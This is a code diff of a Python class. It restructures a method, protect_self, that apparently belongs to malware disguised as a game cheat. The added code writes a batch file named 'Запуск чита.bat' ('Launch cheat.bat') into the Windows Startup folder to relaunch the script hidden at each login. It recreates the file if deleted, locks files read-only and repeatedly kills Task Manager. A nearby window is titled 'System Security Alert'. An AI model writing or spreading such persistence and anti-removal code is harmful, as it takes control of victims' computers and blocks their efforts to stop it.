@@ -31,41 +31,36 @@ class a:
             except:
                 pass
             time.sleep(1)
-        def protect_self(self):
-            import subprocess
-            import shutil
-            script_dir = os.path.dirname(os.path.abspath(__file__))
-            bat_name = 'Запуск чита.bat'
-            bat_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', bat_name)
-            pyw_path = os.path.abspath(__file__)
-            while True:
-                try:
-                    tasks = subprocess.check_output('tasklist', creationflags=0x08000000).decode(errors='ignore')
-                    if 'Taskmgr.exe' in tasks or 'taskmgr.exe' in tasks:
-                        subprocess.call('taskkill /F /IM taskmgr.exe', creationflags=0x08000000, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                    for line in tasks.splitlines():
-                        if ('python.exe' in line.lower() or 'pythonw.exe' in line.lower()) and str(os.getpid()) not in line:
-                            pass
 
-
-                    if not os.path.exists(pyw_path):
-
-                        if os.path.exists(bat_path):
-                            shutil.copy2(bat_path, pyw_path)
-                    if not os.path.exists(bat_path):
-
-                        with open(bat_path, 'w', encoding='utf-8') as f:
-                            f.write(f'@echo off\r\nstart "" /min pythonw "{pyw_path}"\r\n')
-
-
-                    try:
-                        os.chmod(pyw_path, stat.S_IREAD)
-                        os.chmod(bat_path, stat.S_IREAD)
-                    except:
+    def protect_self(self):
+        import subprocess
+        import shutil
+        script_dir = os.path.dirname(os.path.abspath(__file__))
+        bat_name = 'Запуск чита.bat'
+        bat_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', bat_name)
+        pyw_path = os.path.abspath(__file__)
+        while True:
+            try:
+                tasks = subprocess.check_output('tasklist', creationflags=0x08000000).decode(errors='ignore')
+                if 'Taskmgr.exe' in tasks or 'taskmgr.exe' in tasks:
+                    subprocess.call('taskkill /F /IM taskmgr.exe', creationflags=0x08000000, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                for line in tasks.splitlines():
+                    if ('python.exe' in line.lower() or 'pythonw.exe' in line.lower()) and str(os.getpid()) not in line:
                         pass
+                if not os.path.exists(pyw_path):
+                    if os.path.exists(bat_path):
+                        shutil.copy2(bat_path, pyw_path)
+                if not os.path.exists(bat_path):
+                    with open(bat_path, 'w', encoding='utf-8') as f:
+                        f.write(f'@echo off\r\nstart "" /min pythonw "{pyw_path}"\r\n')
+                try:
+                    os.chmod(pyw_path, stat.S_IREAD)
+                    os.chmod(bat_path, stat.S_IREAD)
                 except:
                     pass
-                time.sleep(1)
+            except:
+                pass
+            time.sleep(1)
         
     def c(self):
         self.b.title("System Security Alert")
